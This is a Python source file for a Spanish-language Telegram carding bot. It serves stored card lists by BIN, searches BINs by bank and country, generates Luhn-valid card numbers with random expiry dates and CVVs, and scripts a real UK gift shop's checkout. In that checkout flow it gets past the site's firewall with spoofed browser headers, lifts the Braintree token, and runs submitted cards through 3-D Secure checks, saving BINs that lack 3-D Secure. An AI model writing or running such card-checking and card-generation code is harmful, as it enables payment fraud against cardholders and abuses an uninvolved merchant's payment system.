# handlers/card_tools.py
from config import V_MAP, T_MAP, L_MAP # Asegúrate de que estos estén en config.py
from database import load_extras, get_rango # Cambia load_keys por load_extras
from engines.bins_engine import fetch_bins_engine, get_bin_dict, get_bin_info
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from io import BytesIO
import database 
from database import get_rango 
from database import check_antispam_vbv
from engines.bins_engine import fetch_bins_engine, get_bin_info
from gates.vbv import check_braintree_3d, capture
from database import antispam_db  # Importamos el diccionario
import time
import json
import os
import json
import random
import httpx
import re
import asyncio
import base64
import urllib.parse

OWNER_ID = 5651880136
ADMINS = [5133617831]

JSON_PATH = 'keys.json'

# handlers/card_tools.py

V_MAP = {
    "VISA": "Visa", "MC": "MASTERCARD", "MASTERCARD": "MASTERCARD", 
    "AMEX": "AMERICAN EXPRESS", "AMERICAN": "AMERICAN EXPRESS",
    "MAESTRO": "Maestro", "DISCOVER": "Discover", "JCB": "JCB"
}
T_MAP = {"DEBIT": "Debit", "CREDIT": "Credit", "CHARGE": "Charge Card"}
L_MAP = {
    "PLATINUM": "Platinum", "GOLD": "Gold", "CLASSIC": "Classic", 
    "STANDARD": "Standard", "WORLD": "World", "BUSINESS": "Business",
    "CORPORATE": "Corporate", "PREPAID": "Prepaid", "ELECTRON": "Visa Electron"
}


cache_bins = {}

async def extra_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    # 1. Verificación de Rango
    if get_rango(u.effective_user.id) < 1:
        return await u.message.reply_text("❌ Acceso Premium Requerido.")
    
    # 2. Verificar argumentos
    args = c.args
    if not args:
        return await u.message.reply_text(
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        "<b>[ TOOLS > EXTRA ]</b>\n\n"
        "<b>Uso ></b>\n\n"
        "<code>/extra 512314</code>\n"
        "<code>/extra 512314 15</code>\n"
        "<code>/extra 512314 all</code>\n\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>",
        parse_mode='HTML'
    )
    
    # Tomamos los primeros 6 dígitos del BIN
    bin_b = args[0][:6]
    
    # 3. Cargar el archivo de extras (asegúrate que load_extras abra database_apion.json)
    from database import load_extras
    db_extras = await load_extras() 
    
    if bin_b in db_extras:
        lista_completa = db_extras[bin_b]
        
        # --- LÓGICA DE CANTIDAD ---
        if len(args) > 1:
            if args[1].lower() == "all":
                final = lista_completa
            elif args[1].isdigit():
                final = lista_completa[:int(args[1])]
            else:
                final = lista_completa[:10] # Por defecto 10 si escriben mal
        else:
            final = lista_completa[:10] # Por defecto 10
            
        # --- LÓGICA DE ENVÍO ---
        # Si son más de 30 o pidió 'all', enviamos un archivo .txt
        if len(final) > 30 or (len(args) > 1 and args[1].lower() == "all"):
            output = BytesIO(("\n".join(final)).encode())
            
            # Nuevo diseño del caption en cuadros
            caption_txt = (
                "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
                f"• <b>Extra |</b> <code>{bin_b}</code>\n"
                f"• <b>Total |</b> <code>{len(final)}</code> Cards\n"
                "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>"
            )
            
            await u.message.reply_document(
                document=output, 
                filename=f"extra_{bin_b}.txt", 
                caption=caption_txt,
                parse_mode='HTML' # Cambiamos de Markdown a HTML
            )
        else:
            # Si son pocas, enviamos mensaje de texto normal
           lista_cards = "\n".join([f"<code>{r}</code>" for r in final])

        txt = (
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
            f"• <b>Extras Encontradas |</b> <code>{bin_b}</code>\n"
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
            f"{lista_cards}\n"
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
            f"• <b>Cantidad |</b> <code>{len(final)}</code>"
        )
    
        await u.message.reply_text(txt, parse_mode='HTML')
    else:
        # Si no está el BIN en el JSON
        await u.message.reply_text(
            "━━ ━ ━ ━ ━ ━ ━ ━ ━━\n"
            f"•Extras no encontradas / BIN inválido\n"
            f"• {bin_b}\n"
            "━━ ━ ━ ━ ━ ━ ━ ━ ━━\n"
        )


async def bin_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if get_rango(u.effective_user.id) < 1:
        return await u.message.reply_text("❌ Sin Acceso Premium.")

    if not c.args:
        return await u.message.reply_text(
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        "<b>[ TOOLS > BIN ]</b>\n\n"
        "<b>Uso ></b> <code>/bin 512314</code>\n\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>",
        parse_mode='HTML'
    )

    bin_num = c.args[0][:6]
    status = await u.message.reply_text(
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b> • Buscando info del BIN > </b> <code>{bin_num}</code>\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>",
        parse_mode='HTML'
    )

    from engines.bins_engine import get_bin_dict
    data = await get_bin_dict(bin_num)

    if not data:
        return await status.edit_text("❌ No encontré información.")

    txt = (
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b> Resultado para > </b> <code>{data['bin']}</code>\n\n"
        
        f"• <b>Bin |</b> <code>{data['bin']}</code>\n"
        f"• <b>Brand |</b> {data['brand']}\n"
        f"• <b>Type |</b> {data['type']}\n"
        f"• <b>Level |</b> {data['level']}\n"
        f"• <b>Bank |</b> {data['bank']}\n"
        f"• <b>Country:</b> {data['pais']}\n\n"
        
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b>Info bin > By:</b> @{u.effective_user.username or 'User'}"
    )
    
    # IMPORTANTE: Cambiar parse_mode a 'HTML'
    await status.edit_text(txt, parse_mode='HTML')

async def bin_master_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if get_rango(u.effective_user.id) < 1: 
        return await u.message.reply_text("❌ Sin Acceso Premium.")
    
    cmd = u.message.text.split()[0][1:].lower()
    mode = "bank" if "binbank" in cmd else "country"
    args = c.args

    if not args:
        help_t = "`/binlook [PAIS]`" if mode == "country" else "`/binbank [BANCO]`"
        return await u.message.reply_text(f"❌ Uso: {help_t} [FILTROS]")

    # --- MAPEADO DE FILTROS ---
    vendor, card_type, level, bank, country, limite = "", "", "", "", "", 1000
    identificador = []

    for arg in args:
        a_up = arg.upper()
        if a_up.isdigit() and int(a_up) > 10: limite = int(a_up)
        elif a_up in V_MAP: vendor = V_MAP[a_up]
        elif a_up in T_MAP: card_type = T_MAP[a_up]
        elif a_up in L_MAP: level = L_MAP[a_up]
        else: identificador.append(arg)

    sujeto = " ".join(identificador).upper()
    if mode == "country": country = sujeto
    else: bank = sujeto

    # Mensaje de estado con filtros visibles
    detalles = []
    if vendor: detalles.append(f"💳 `{vendor}`")
    if card_type: detalles.append(f"💰 `{card_type}`")
    if level: detalles.append(f"📊 `{level}`")
    
    msg = f"⏳ Buscando: `{sujeto}`"
    if detalles: msg += f"\n🎯 Filtros: {' | '.join(detalles)}"
    
    status = await u.message.reply_text(msg, parse_mode='Markdown')

    from engines.bins_engine import fetch_bins_engine
    data = await fetch_bins_engine(country=country, bank=bank, vendor=vendor, card_type=card_type, level=level, limit=limite)

    if not data or data == "EMPTY":
        return await status.edit_text("⚠️ No se hallaron resultados.")

    # Cache para botones
    chat_id = u.effective_chat.id
    sorted_keys = sorted(data.keys(), key=lambda x: (x == "indefinido", x))
    cache_bins[chat_id] = {"data": data, "sorted_keys": sorted_keys, "query": sujeto}

    keyboard = [[InlineKeyboardButton(f"🏦 {data[k]['nombre'][:35]}", callback_data=f"bnk_{i}")] for i, k in enumerate(sorted_keys)]
    await status.edit_text(f"✅ Resultados para: *{sujeto}*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')




def luhn_checksum(card_number):
    digits = [int(d) for d in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10 == 0

def gen_logic(bin_format):
    # Separar bin|mm|aa|cvv
    parts = bin_format.split('|')
    cc_part = parts[0]
    mm = parts[1] if len(parts) > 1 and parts[1] not in ["", "rnd"] else None
    yy = parts[2] if len(parts) > 2 and parts[2] not in ["", "rnd"] else None
    cvv = parts[3] if len(parts) > 3 and parts[3] not in ["", "rnd"] else None

    # Generar número de tarjeta
    cc_base = "".join(re.findall(r'\d', cc_part))
    card = cc_base
    while len(card) < 15:
        card += str(random.randint(0, 9))
    for i in range(10):
        if luhn_checksum(card + str(i)):
            card += str(i)
            break
            
    # Asignar valores (si no existen, random)
    month = mm if mm else random.choice([str(i).zfill(2) for i in range(1, 13)])
    year = yy if yy else random.choice(["2025", "2026", "2027", "2028", "2029", "2030"])
    cvv_res = cvv if cvv else str(random.randint(100, 999))
    
    return f"{card}|{month}|{year}|{cvv_res}"

U_SID = "1bcc6b9b-2d9d-4d05-8557-aa341f329650"
U_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"




async def vbv_command_handler(u: Update, context):
    # 1. Validación de entrada
    query = u.message.text.split(' ', 1)
    if len(query) < 2:
        return await u.message.reply_text(
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
            "<b>[ Tool VBV ]</b>\n\n"
            "<b>Uso ></b> <code>/vbv cc|mes|año|cvv</code>\n\n"
            "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>",
            parse_mode="HTML")
    
    
    user_id = u.effective_user.id
    
    # Una sola línea para el antispam
    puedo_pasar, espera = check_antispam_vbv(user_id, OWNER_ID, ADMINS)
    
    if not puedo_pasar:
        return await u.message.reply_text(
            f"<b>⚠️ ANTISPAM</b>\n\nDebes esperar <b>{espera}s</b>.",
            parse_mode="HTML"
        )

    lista_raw = query[1].split('\n')
    # Limpiamos líneas vacías
    lista = [c.strip() for c in lista_raw if c.strip()]
    
    msg = await u.message.reply_text("<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>\n"
        f"<b> • Verificando --- Espere </b>\n"
        "<b>━━ ━ ━ ━ ━ ━ ━ ━ ━━</b>",
        parse_mode='HTML')

    # 2. Headers de Navegación Real (Evitan el 403 Forbidden)
    headers_browser = {
        "User-Agent": U_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "es-ES,es;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
    }

    # Usamos un solo cliente para toda la operación del comando
    async with httpx.AsyncClient(verify=False, timeout=45.0, headers=headers_browser, follow_redirects=True) as s:
        try:
            # --- PASO 1: BYPASS FIREWALL (HOME + PRODUCTO) ---
            await s.get("https://giftstomorrow.co.uk/") # Galleta inicial
            
            p_url = "https://giftstomorrow.co.uk/product/jager-bomb-shots-novelty-cocktail-party-mixer-chamber-set-of-4/"
            r_prod = await s.get(p_url)
            
            if r_prod.status_code == 403:
                return await msg.edit_text("<b>❌ Error 403: La IP del bot está bloqueada.</b>", parse_mode="HTML")

            hvftok = capture(r_prod.text, 'name="hvftok7814" value="', '"') or "222565"
            
            # --- PASO 2: AGREGAR AL CARRITO (AJAX) ---
            ajax_headers = {
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": p_url,
                "Origin": "https://giftstomorrow.co.uk"
            }
            
            gtm = urllib.parse.quote('{"internal_id":2111,"id":2111}')
            payload = f"quantity=1&gtm4wp_product_data={gtm}&alt_s=&hvftok7814={hvftok}&product_id=2111"
            
            await s.post("https://giftstomorrow.co.uk/?wc-ajax=add_to_cart", content=payload, headers=ajax_headers)

            # --- PASO 3: OBTENER BEARER TOKEN ---
            r_check = await s.get("https://giftstomorrow.co.uk/checkout/", headers={"Referer": p_url})
            ey = capture(r_check.text, 'wc_braintree_client_token = ["', '"')
            
            if not ey:
                return await msg.edit_text("<b>❌ Error: Carrito vacío o sesión invalidada.</b>", parse_mode="HTML")

            bearer = capture(base64.b64decode(ey).decode("utf-8"), '"authorizationFingerprint":"', '"')
            
            # --- PASO 4: EJECUTAR RÁFAGA CONTROLADA ---
            
            stats = {'token_dead': False}
            semaphore = asyncio.Semaphore(5) # 5 hilos para evitar saturar el bot
            
            tasks = [check_braintree_3d(card, s, bearer, stats, semaphore) for card in lista]
            results = await asyncio.gather(*tasks)

            # --- PASO 5: FORMATEAR RESPUESTA FINAL ---
            final_text = ""
            bins_to_save = [] # Lista temporal para la DB
            
            user_handle = f"@{u.effective_user.username}" if u.effective_user.username else f"ID: {u.effective_user.id}"

            for r in results:
                if not r: continue
                
                status_raw = r['status']
                status_low = status_raw.lower()
                bin_6 = r['card'][:6]
                
                # Definir si es un BIN "Joya" (Attempt)
                is_attempt = "attempt" in status_low
                
                if "successful" in status_low or is_attempt:
                    estatus_vbv = "NON VBV 3D ✅"
                    icono_top = "✅"
                    # Si es attempt, lo preparamos para la DB
                    if is_attempt:
                        bins_to_save.append({"bin": bin_6, "by": user_handle})
                else:
                    estatus_vbv = "VBV 3D ❌"
                    icono_top = "❌"

                # Construcción del diseño solicitado
                final_text += (
                    f"<b>VBV INFO | [APION BOT] {icono_top}</b>\n\n"
                    f"<b>Estos son los datos encontrados por la base de datos (Braintree)</b>\n\n"
                    f"<b>Bin:</b> <code>{bin_6}</code>\n"
                    f"<b>Estatus:</b> {estatus_vbv}\n"
                    f"<b>Info:</b> <code>{status_raw}</code> Y\n\n"
                    f"<b>Gateway:</b> B3 VBV\n"
                    f"<b>Checked by:</b> {user_handle}\n"
                    f"<b>────────────────────</b>\n\n"
                )

            # --- LÓGICA DE GUARDADO EN JSON ---
            if bins_to_save:
                db_path = "bins_non_vbv.json"
                # Cargar DB existente o crear una nueva
                if os.path.exists(db_path):
                    with open(db_path, "r") as f:
                        try:
                            current_db = json.load(f)
                        except: current_db = []
                else:
                    current_db = []

                # Evitar duplicados y guardar
                existing_bins = {item['bin'] for item in current_db}
                for b_data in bins_to_save:
                    if b_data['bin'] not in existing_bins:
                        current_db.append(b_data)
                
                with open(db_path, "w") as f:
                    json.dump(current_db, f, indent=4)

            await msg.edit_text(final_text, parse_mode="HTML")

        except Exception as e:
            await msg.edit_text(f"<b>❌ Error crítico:</b> <code>{str(e)}</code>", parse_mode="HTML")